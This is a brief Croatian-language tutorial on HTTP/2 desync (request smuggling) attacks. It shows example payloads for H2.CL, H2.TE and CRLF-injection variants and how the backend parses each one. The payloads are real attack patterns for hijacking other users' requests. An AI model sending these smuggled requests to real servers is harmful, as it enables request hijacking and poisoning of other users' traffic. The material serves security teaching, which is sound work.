HTTP/2 Desync

Desync exploitacija se događa kada komuniciramo sa frontendom preko HTTP/2, a međusobno backend i frontend rade preko HTTP/1.1

H2.CL
Do exploitacije content lenghta dolazi kada se http/2 request snižava na http/1.1 gjde kada procita COntent-Length 0 i odvoji u dodatnu poruku.
Primjer poruke:
------------------------------------
HTTP/2.0
:mtehod POST
:path /
:scheme https
:authority google.com
user-agent Mozilla/5.0
content-length 0
HELLO

se salje na frontend i onda frontend to prevara u http 1.1
Primjer onoga sto backend dobije sa frontenda:
----------------------------------------------------
POST / HTTP/1.1\r\n
Host: google.com\r\n
User-Agent: Mozilla/5.0\r\n
Content-Length: 0\r\n
\r\n
(U novom paketu)
HELLO

Obratite poznrost da nakon HELLO nema \r\n, i to znaci da iduca poruka koja ce doci ce biti dodana na taj HELLO i biti odbacena
Primjer iduce legitimne poruke:
HELLOGET / HTTP/1.1\r\n
...

H2.TE
Ovo je eksplotacija koja se bazira na Transfer-Encoding: chunked headeru.
Primjer poruke:
------------------------------------
HTTP/2.0
:mtehod POST
:path /
:scheme https
:authority google.com
user-agent Mozilla/5.0
transfer-encoding chunked
0\r\n
\r\n
GET /other HTTP/1.1\r\n
Foo: s

I nakon toga backend to procesira ovako:
POST / HTTP/1.1\r\n
Host: google.com\r\n
User-Agent: Mozilla/5.0\r\n
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
\r\n
(U novom paketu)
GET /other HTTP/1.1\r\n
Foo: s

I kada novi korisnik posalje poruku njegov prvi redak ce se nadodati na header koji se ne koristi i izgledati ce ovako:

GET /other HTTP/1.1\r\n
Foo: sGET /otherSite HTTP/1.1\r\n
....

CRLF injection
CR je Carriage Return i explot se bazira na tome da se kreira zaglavlje koje sadrzi neki tekst i kada se pretvara u 1.1 on ga ne stavi pod jedan header nego ga nepravilno formatira.
Zbog toga se uzima samo prvi "redak" teksta u headeru i ostatak se samo napise kao plaintext izvan tog headera.

Primjer:
----------------------------------------------
HTTP/2.0
:mtehod POST
:path /
:scheme https
:authority google.com
user-agent Mozilla/5.0
Foo bar\r\n Content-Length:0\r\n\r\nGET /other HTTP/1.1\r\nX:x

I backend dobiva ovakve pakete:

POST / HTTP/1.1\r\n
Host: google.com\r\n
User-Agent: Mozilla/5.0\r\n
Foo: bar\r\n
Content-Length: 0\r\n
\r\n

(U novom paketu)
GET /other HTTP/1.1\r\n
X:x